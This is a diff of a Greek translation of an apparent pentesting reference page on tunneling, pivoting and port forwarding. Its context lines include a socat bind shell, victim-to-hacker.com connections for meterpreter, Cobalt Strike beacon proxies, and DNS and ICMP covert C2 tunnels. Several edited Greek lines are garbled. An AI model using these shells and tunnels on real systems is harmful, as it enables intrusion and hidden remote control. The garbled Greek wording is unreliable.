@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Ασφάλεια – Επίθεση Terrapin (CVE-2023-48795)**
-> Η επίθεση υποβάθμισης Terrapin του 2023 μπορεί να επιτρέψει σε έναν επιτιθέμενο man-in-the-middle να παραποιήσει την πρώιμη διαδικασία handshake του SSH και να εισάγει δεδομένα σε **οποιοδήποτε προωθημένο κανάλι** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο πελάτης όσο και ο διακομιστής είναι ενημερωμένοι (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγόριθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.
+> Η επίθεση υποβάθμισης Terrapin του 2023 μπορεί να επιτρέψει σε έναν επιτιθέμενο man-in-the-middle να παραποιήσει το αρχικό handshake SSH και να εισάγει δεδομένα σε **οποιοδήποτε προωθημένο κανάλι** ( `-L`, `-R`, `-D` ). Βεβαιωθείτε ότι τόσο ο πελάτης όσο και ο διακομιστής είναι ενημερωμένοι (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ή απενεργοποιήστε ρητά τους ευάλωτους αλγόριθμους `chacha20-poly1305@openssh.com` και `*-etm@openssh.com` στο `sshd_config`/`ssh_config` πριν βασιστείτε σε SSH tunnels.
 
 ## SSHUTTLE
 
 Μπορείτε να **δημιουργήσετε σήραγγα** μέσω **ssh** όλης της **κυκλοφορίας** σε ένα **υποδίκτυο** μέσω ενός κεντρικού υπολογιστή.\
-Για παράδειγμα, προωθώντας όλη την κυκλοφορία που πηγαίνει προς το 10.10.10.0/24
+Για παράδειγμα, προωθώντας όλη την κυκλοφορία που πηγαίνει στο 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -121,7 +121,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Ένας άλλος τρόπος:
+Άλλος τρόπος:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Ανοίξτε μια θύρα στον teamserver που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για να **δρομολογήσουν την κίνηση μέσω του beacon**.
+Ανοίξτε μια θύρα στον server της ομάδας που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για **να δρομολογήσουν την κίνηση μέσω του beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,14 +149,14 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Σε αυτή την περίπτωση, το **θύρα ανοίγεται στον host beacon**, όχι στον Team Server και η κίνηση αποστέλλεται στον Team Server και από εκεί στον υποδεικνυόμενο host:port
+> Σε αυτή την περίπτωση, το **θύρα ανοίγει στον host beacon**, όχι στον Team Server και η κίνηση αποστέλλεται στον Team Server και από εκεί στον υποδεικνυόμενο host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Για σημείωση:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση με τον Server Ομάδας, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
 - Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 - **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
@@ -262,7 +262,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Bind shell
+### Δεσμός κελύφους
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
+Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στη κονσόλα του θύματος:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου υπολογιστή
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου.
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).
 
-Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
+Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στον θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,13 +347,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Πρέπει να έχετε **RDP πρόσβαση στο σύστημα**.\
+Πρέπει να έχετε **πρόσβαση RDP στο σύστημα**.\
 Κατεβάστε:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling πακέτων μέσω της σύνδεσης RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **την τούνελινγκ πακέτων μέσω της σύνδεσης RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Στον υπολογιστή-πελάτη σας φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
+Στον υπολογιστή-πελάτη σας, φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -370,9 +370,9 @@ netstat -antb | findstr 1080
 ```
 Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
 
-## Προξενήστε εφαρμογές Windows GUI
+## Προξενήστε εφαρμογές GUI των Windows
 
-Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
+Μπορείτε να κάνετε τις εφαρμογές GUI των Windows να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
 Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
 Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις προς τις διευθύνσεις IP που θέλετε να προξενήσετε.
 
@@ -396,8 +396,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στην θυματική μηχανή την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
-Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην θύρα 2222.
+Τώρα, αν ρυθμίσετε για παράδειγμα στον θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
+Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
 
 ## YARP
 
@@ -409,7 +409,7 @@ Tunnel 2222:<attackers_machine>:443
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας DNS ερωτήματα.
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας ερωτήματα DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -423,7 +423,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**
 
-Establishes a C\&C channel through DNS. It doesn't need root privileges.
+Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -446,9 +446,9 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Αλλαγή DNS του proxychains
 
-Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει τα αιτήματα DNS tcp μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
+Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και σήραγγες το tcp DNS αίτημα μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
 
-## Τούνελ σε Go
+## Σήραγγες σε Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -459,7 +459,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
+Απαιτείται δικαιώματα root και στα δύο συστήματα για να δημιουργηθούν προσαρμογείς tun και να σήραγγες δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -502,7 +502,7 @@ chmod a+x ./ngrok
 
 _Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο._
 
-#### Tunneling TCP
+#### Τούνελινγκ TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -574,11 +574,11 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Επειδή όλη η κίνηση φεύγει από τον υπολογιστή **outbound over 443**, οι σήραγγες Cloudflared είναι ένας απλός τρόπος για να παρακάμψετε τα ingress ACLs ή τα NAT boundaries. Να είστε προσεκτικοί ότι το δυαδικό αρχείο συνήθως εκτελείται με αυξημένα δικαιώματα – χρησιμοποιήστε κοντέινερ ή την επιλογή `--user` όταν είναι δυνατόν.
+Γιατί όλη η κίνηση φεύγει από τον υπολογιστή **outbound over 443**, οι σήραγγες Cloudflared είναι ένας απλός τρόπος για να παρακάμψετε τα ingress ACLs ή τα NAT boundaries. Να είστε προσεκτικοί ότι το δυαδικό αρχείο συνήθως εκτελείται με αυξημένα δικαιώματα – χρησιμοποιήστε κοντέινερ ή την επιλογή `--user` όταν είναι δυνατόν.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) είναι ένα ενεργά συντηρούμενο Go reverse-proxy που υποστηρίζει **TCP, UDP, HTTP/S, SOCKS και P2P NAT-hole-punching**. Ξεκινώντας από **v0.53.0 (Μάιος 2024)** μπορεί να λειτουργήσει ως **SSH Tunnel Gateway**, έτσι ώστε ένας στόχος υπολογιστής να μπορεί να δημιουργήσει μια αντίστροφη σήραγγα χρησιμοποιώντας μόνο τον προεπιλεγμένο πελάτη OpenSSH – δεν απαιτείται επιπλέον δυαδικό αρχείο.
+[`frp`](https://github.com/fatedier/frp) είναι ένα ενεργά συντηρούμενο Go reverse-proxy που υποστηρίζει **TCP, UDP, HTTP/S, SOCKS και P2P NAT-hole-punching**. Ξεκινώντας από **v0.53.0 (Μάιος 2024)** μπορεί να λειτουργήσει ως **SSH Tunnel Gateway**, έτσι ώστε ένας στόχος υπολογιστής να μπορεί να δημιουργήσει μια αντίστροφη σήραγγα χρησιμοποιώντας μόνο τον stock OpenSSH client – δεν απαιτείται επιπλέον δυαδικό αρχείο.
 
 ### Κλασική αντίστροφη σήραγγα TCP
 ```bash
